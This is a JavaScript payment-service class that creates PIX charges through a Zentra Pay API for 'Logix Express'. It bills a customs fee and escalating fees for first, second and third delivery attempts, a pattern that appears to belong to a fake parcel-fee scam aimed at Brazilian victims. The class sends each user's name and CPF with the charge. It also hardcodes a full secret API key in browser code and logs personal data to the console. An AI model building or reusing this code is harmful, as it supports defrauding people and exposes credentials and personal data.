/**
 * Serviço de integração com Zentra Pay - VERSÃO OFICIAL COM API-SECRET
 */
export class ZentraPayService {
    constructor() {
        this.baseURL = 'https://api.zentrapaybr.com';
        this.apiSecret = this.getApiSecret();
        this.webhookUrl = this.getWebhookUrl();
        console.log('🔑 ZentraPayService inicializado com API Zentra Pay Brasil');
        console.log('🔐 API Secret configurada:', this.apiSecret ? 'SIM' : 'NÃO');
        console.log('🔗 Webhook URL:', this.webhookUrl);
    }

    getApiSecret() {
        // ✅ INSERIR SUA CHAVE API SECRET ZENTRA PAY AQUI:
        // Substitua 'SUA_CHAVE_API_SECRET_AQUI' pela sua chave real da Zentra Pay
        const apiSecret = window.ZENTRA_PAY_SECRET_KEY || 
                         localStorage.getItem('zentra_pay_secret_key') ||
                         'sk_a7da0a8cfc7bac4836572ab2068fd3059493dd63a97ab76ceb5dd46b50a9941f654da937b48ae2a4ded1468217c0291be0eccc264ecd9e92ca9eff27231c968e';
        
        if (apiSecret && apiSecret !== 'sk_a7da0a8cfc7bac4836572ab2068fd3059493dd63a97ab76ceb5dd46b50a9941f654da937b48ae2a4ded1468217c0291be0eccc264ecd9e92ca9eff27231c968e') {
            console.log('✅ API Secret Zentra Pay válida encontrada');
            console.log('🔑 Secret (primeiros 20 chars):', apiSecret.substring(0, 20) + '...');
        } else {
            console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")');
        }
        
        return apiSecret;
    }

    getWebhookUrl() {
        // ✅ URL DO WEBHOOK PARA CONFIGURAR NA ZENTRA PAY:
        // Configure esta URL no painel da Zentra Pay como webhook
        const baseUrl = window.location.origin;
        return `${baseUrl}/webhook/zentra-pay`;
    }

    getProductConfig(type) {
        // Configurações dos produtos conforme especificado
        const products = {
            'taxa_alfandegaria': {
                id: 'UlCGsjOn',
                nome: 'Taxa Alfandegária',
                valor: 26.34,
                checkout_url: 'https://checkout.zentrapaybr.com/UlCGsjOn'
            },
            'tentativa_entrega_1': {
                id: 'xPTSsVmH',
                nome: 'Tentativa de Entrega 1°',
                valor: 9.74,
                checkout_url: 'https://checkout.zentrapaybr.com/xPTSsVmH'
            },
            'tentativa_entrega_2': {
                id: 'xkgmEGMN',
                nome: 'Tentativa de Entrega 2°',
                valor: 14.98,
                checkout_url: 'https://checkout.zentrapaybr.com/xkgmEGMN'
            },
            'tentativa_entrega_3': {
                id: 'jnHNAKcF',
                nome: 'Tentativa de Entrega 3°',
                valor: 18.96,
                checkout_url: 'https://checkout.zentrapaybr.com/jnHNAKcF'
            }
        };
        
        return products[type] || products['taxa_alfandegaria'];
    }

    generateUniqueEmail(timestamp) {
        const randomSuffix = Math.random().toString(36).substring(2, 8);
        return `lead${timestamp}_${randomSuffix}@tempmail.com`;
    }

    generateUniquePhone(timestamp) {
        const phoneSuffix = timestamp.toString().slice(-8);
        return `11${phoneSuffix}`;
    }

    generateExternalId() {
        const timestamp = Date.now();
        const randomId = Math.random().toString(36).substring(2, 8);
        return `bolt_${timestamp}_${randomId}`;
    }

    async createPixTransaction(userData, valorEmReais, productType = 'taxa_alfandegaria') {
        try {
            const timestamp = Date.now();
            const externalId = this.generateExternalId();
            const productConfig = this.getProductConfig(productType);

            // Re-avaliar API secret antes da requisição
            this.apiSecret = this.getApiSecret();
            
            // Validar API secret antes de prosseguir
            if (!this.apiSecret || this.apiSecret === 'SUA_CHAVE_API_SECRET_AQUI') {
                throw new Error('API Secret não configurada. Configure usando: configurarZentraPay("sua_chave")');
            }

            // Usar dados reais do usuário extraídos do Supabase
            const email = userData.email || this.generateUniqueEmail(timestamp);
            const telefone = userData.telefone || this.generateUniquePhone(timestamp);
            
            console.log('📧 Email usado:', email);
            console.log('📱 Telefone usado:', telefone);
            console.log('🛍️ Produto:', productConfig.nome);

            // Dados da transação conforme API Zentra Pay Brasil
            const transactionData = {
                external_id: externalId,
                total_amount: parseFloat(valorEmReais), // Valor em reais
                payment_method: "PIX",
                webhook_url: this.webhookUrl,
                items: [
                    {
                        id: productConfig.id,
                        title: productConfig.nome,
                        quantity: 1,
                        price: parseFloat(valorEmReais),
                        description: `${productConfig.nome} - Logix Express`,
                        is_physical: false
                    }
                ],
                ip: this.getClientIP(),
                customer: {
                    name: userData.nome,
                    email: email,
                    phone: telefone,
                    document_type: "CPF",
                    document: userData.cpf.replace(/[^\d]/g, '')
                }
            };

            console.log('🚀 Criando transação Zentra Pay Brasil:', {
                external_id: transactionData.external_id,
                total_amount: `R$ ${transactionData.total_amount.toFixed(2)}`,
                payment_method: transactionData.payment_method,
                webhook_url: transactionData.webhook_url,
                product_id: productConfig.id,
                customer: {
                    name: transactionData.customer.name,
                    document: transactionData.customer.document,
                    email: transactionData.customer.email,
                    phone: transactionData.customer.phone,
                    document_type: transactionData.customer.document_type
                }
            });

            // Headers conforme documentação Zentra Pay Brasil
            const headers = {
                'Authorization': `Bearer ${this.apiSecret}`,
                'Content-Type': 'application/json'
            };

            console.log('📡 Headers da requisição:', {
                'Authorization': `Bearer ${this.apiSecret.substring(0, 20)}...`,
                'Content-Type': headers['Content-Type']
            });

            const response = await fetch(`${this.baseURL}/v1/transactions`, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(transactionData)
            });

            console.log('📡 Status da resposta:', response.status);

            if (!response.ok) {
                const errorText = await response.text();
                console.error('❌ Erro na API Zentra Pay Brasil:', {
                    status: response.status,
                    statusText: response.statusText,
                    body: errorText
                });
                
                throw new Error(`Erro na API: ${response.status} - ${errorText}`);
            }

            const result = await response.json();
            console.log('✅ Resposta Zentra Pay Brasil recebida:', {
                transaction_id: result.transaction_id || result.id,
                external_id: result.external_id,
                has_pix_code: !!result.pix_code,
                has_qr_code: !!result.qr_code_url,
                status: result.status,
                payment_method: result.payment_method
            });

            // Validar resposta da Zentra Pay Brasil
            if (!result.pix_code) {
                console.error('❌ Resposta incompleta da API Zentra Pay Brasil:', result);
                throw new Error('Resposta da API não contém o código PIX necessário');
            }

            console.log('🎉 PIX gerado com sucesso via Zentra Pay Brasil!');
            console.log('📋 PIX Code (copia e cola):', result.pix_code);
            
            return {
                success: true,
                externalId: externalId,
                pixPayload: result.pix_code, // Campo principal da Zentra Pay Brasil
                qrCode: result.qr_code_url || null,
                transactionId: result.transaction_id || result.id,
                email: email,
                telefone: telefone,
                valor: valorEmReais,
                productType: productType,
                productConfig: productConfig,
                status: result.status || 'pending',
                paymentMethod: result.payment_method || 'PIX',
                timestamp: timestamp
            };

        } catch (error) {
            console.error('💥 Erro ao criar transação PIX:', {
                message: error.message,
                stack: error.stack,
                apiSecret: this.apiSecret ? 'CONFIGURADA' : 'NÃO CONFIGURADA'
            });
            
            return {
                success: false,
                error: error.message,
                details: error.stack
            };
        }
    }

    getClientIP() {
        // Tentar obter IP real do cliente
        return '127.0.0.1'; // Fallback para desenvolvimento
    }

    // Método para configurar a API secret dinamicamente
    setApiSecret(apiSecret) {
        if (!apiSecret || apiSecret === 'SUA_CHAVE_API_SECRET_AQUI') {
            console.error('❌ API Secret inválida fornecida');
            return false;
        }
        
        this.apiSecret = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        console.log('🔑 API Secret Zentra Pay Brasil atualizada com sucesso');
        return true;
    }

    // Método para testar a conexão com a API
    async testConnection() {
        try {
            console.log('🔍 Testando conexão com Zentra Pay Brasil...');
            
            // Re-avaliar API secret antes do teste
            this.apiSecret = this.getApiSecret();
            
            // Validar API secret antes do teste
            if (!this.apiSecret || this.apiSecret === 'SUA_CHAVE_API_SECRET_AQUI') {
                throw new Error('API Secret inválida para teste de conexão');
            }
            
            const response = await fetch(`${this.baseURL}/v1/health`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.apiSecret}`,
                    'Content-Type': 'application/json'
                }
            });
            
            if (response.ok) {
                console.log('✅ Conexão com Zentra Pay Brasil OK');
                return true;
            } else {
                console.warn('⚠️ Problema na conexão:', response.status);
                return false;
            }
        } catch (error) {
            console.error('❌ Erro ao testar conexão:', error);
            return false;
        }
    }

    // Método para validar a API secret
    validateApiSecret() {
        if (!this.apiSecret) {
            console.error('❌ Nenhuma API Secret configurada');
            return false;
        }
        
        if (this.apiSecret === 'SUA_CHAVE_API_SECRET_AQUI') {
            console.error('❌ API Secret não foi configurada (ainda usando placeholder)');
            return false;
        }
        
        if (this.apiSecret.length < 20) {
            console.error('❌ API Secret muito curta');
            return false;
        }
        
        console.log('✅ API Secret válida');
        return true;
    }

    // Método para gerar PIX para diferentes tipos de cobrança
    async generatePixForStage(userData, stageType) {
        console.log('🔄 Gerando PIX automático para:', stageType);
        
        const productConfig = this.getProductConfig(stageType);
        
        try {
            const result = await this.createPixTransaction(
                userData, 
                productConfig.valor, 
                stageType
            );
            
            if (result.success) {
                console.log('✅ PIX gerado automaticamente:', {
                    produto: productConfig.nome,
                    valor: `R$ ${productConfig.valor.toFixed(2)}`,
                    pixCode: result.pixPayload.substring(0, 50) + '...'
                });
            }
            
            return result;
        } catch (error) {
            console.error('❌ Erro ao gerar PIX automático:', error);
            return { success: false, error: error.message };
        }
    }
}